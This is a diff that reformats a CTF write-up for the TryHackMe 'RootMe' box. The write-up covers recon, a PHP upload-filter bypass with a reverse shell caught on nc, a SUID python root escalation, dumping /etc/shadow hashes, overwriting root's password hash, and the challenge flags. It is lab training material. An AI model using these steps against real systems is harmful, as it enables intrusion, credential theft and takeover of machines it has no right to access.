@@ -1,9 +1,12 @@
 ===RootMe	Flutter July 27 2021===
 
 IP 10.10.152.22
-	> export IP=10.10.152.22
+
+> export IP=10.10.152.22
+	
 MYIP 10.10.106.37
-	> export MYIP=10.10.106.37
+
+> export MYIP=10.10.106.37
 
 
 # Recon #
@@ -15,29 +18,31 @@ MYIP 10.10.106.37
 
 $ nmap -sV -sC -T5 -oN nmap_initial $IP
 
-'''
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	'''
+	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-	http-cookie-flags: 
-  		/: 
-    		PHPSESSID: 
-     			httponly flag not set
-	http-server-header: Apache/2.4.29 (Ubuntu)
-	http-title: HackIT - Home
-'''
-	> running SSH
-	> using PHP
+	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+		http-cookie-flags: 
+			/: 
+				PHPSESSID: 
+					httponly flag not set
+		http-server-header: Apache/2.4.29 (Ubuntu)
+		http-title: HackIT - Home
+	'''
+	
+> running SSH
+
+> using PHP
 
 $ gobuster dir http://$IP -w directory-list-2.3-medium.txt -o gobuster_80
 
-'''
-/uploads (Status: 301)
-/css (Status: 301)
-/js (Status: 301)
-/panel (Status: 301)
-/server-status (Status: 403)
-'''
+	'''
+	/uploads (Status: 301)
+	/css (Status: 301)
+	/js (Status: 301)
+	/panel (Status: 301)
+	/server-status (Status: 403)
+	'''
 
 ---------------------
 	Visiting Site
@@ -47,7 +52,7 @@ $ gobuster dir http://$IP -w directory-list-2.3-medium.txt -o gobuster_80
 
 - /panel dir
 	> file upload page
-    > trying PHP file (cat.php)
+    > trying PHP file
     
     	PHP não é permitido!
 
@@ -67,7 +72,7 @@ $ nc -lvnp 4443
 - /uploads dir
 	> running php-reverse-shell.php5
 
-~Session caught on nc
+### Session caught on nc ###
 
 $ id
 
@@ -75,20 +80,23 @@ $ id
 
 - Stabalisation
 
-	'''
-	python -c 'import pty;pty.spawn("/bin/bash")'
-	bash-4.4$ 
-	CTRL Z
-	stty raw -echo
-	fg
-	export TERM=xterm
-	'''
+		'''
+		python -c 'import pty;pty.spawn("/bin/bash")'
+		bash-4.4$ 
+		CTRL Z
+		stty raw -echo
+		fg
+		export TERM=xterm
+		'''
 
 bash-4.4$ ls -l /etc/passwd
-	> world readable
+
+> world readable
+
 bash-4.4$ cat /etc/passwd
 	
-	Users
+> Users
+
 		root
 		rootme
 		test
@@ -153,37 +161,51 @@ bash-4.4$ find / -type f -user root -perm -u=s 2>/dev/null
 	/bin/umount
 	'''
 
-	> /usr/bin/python looks promising
+> /usr/bin/python looks promising
 
 bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
-# id
+\# id
 
 	'uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)'
 
 	> root gained
 
-# find / -type f -name user.txt
+\# find / -type f -name user.txt
 	> /var/www/user.txt
 
-# cat /var/www/user.txt
+\# cat /var/www/user.txt
 	
-***Flag Found***
+*Flag Found*<details>
+<summary>Spoiler</summary>
+	
+> /var/www/user.txt:
+
 	THM{y0u_g0t_a_sh3ll}
 
-# find / -type f -name root.txt
+</details>
+
+
+\# find / -type f -name root.txt
 	>/root/root.txt
 
-# cat /root/root.txt
+\# cat /root/root.txt
 
-***Flag found***
+*Flag Found*<details>
+	<summary>Spoiler</summary>
+	
+> /root/root.txt:
+
 	THM{pr1v1l3g3_3sc4l4t10n}
 
+</details>
 
----Okay, we've gotten all the flags for the challenge... but I'm not quite done---
 
-//let's get those user hashes
-# cat /etc/shadow
+# Okay, we've gotten all the flags for the challenge... but I'm not quite done #
+
+Let's get those user hashes
+
+\# cat /etc/shadow
 	
 	'''
 	root:$6$5osB44J2$24WV3zAR1FTqEq3f2kSqrigUgyDmKucU8rwHvbOJWxIoWSlHbVHV1Ug1eOHqidieZWDU3Y5V3cimChun2JYNw1:18478:0:99999:7:::
@@ -192,18 +214,22 @@ bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
 	test:$6$vXOyvOWZ$UpIjnJq/KuKmKHezW/pEM.nrI6QuqhWWlv/fUmLvJI1YG7nju2vpP3vg1Q0SSf5FCk8058WD5Rc3XXPMRlqHb0:18478:0:99999:7:::
 	'''
-//eh, we can crack them another time for fun, not necessary
+
+> eh, we can crack them another time for fun, not necessary
 
 $ mkpasswd -m sha-512 FlutterWasHere > newpass
+
 	'$6$n0dYLiOE/DZ$6PzFKyQpxCEGIf3ZFHUITMYmMuVH6vYC7QECwuXLJJMLMRKOr5Tf.pEJQMfP22BE9ouZ.A5l1d8c9ctJZ6un3.'
 
-# nano /etc/shadow
-	> replace hash with our own
+\# nano /etc/shadow
+	
+> replace hash with our own
 
-# exit
+\# exit
 
 bash-4.4$ su root
-	> Password: FlutterWasHere
+
+	Password: FlutterWasHere
 
 root@rootme:/# id
 
@@ -211,8 +237,10 @@ root@rootme:/# id
 
 Mwahaha root is all ours now, and the shell is more responsive
 
----Getting rid of the SUID---
+### Getting rid of the SUID ###
 
 root@rootme:/# chmod 755 /usr/bin/python
+
 root@rootme:/# ls -l /usr/bin/python
+
 	'-rwxr-xr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python'
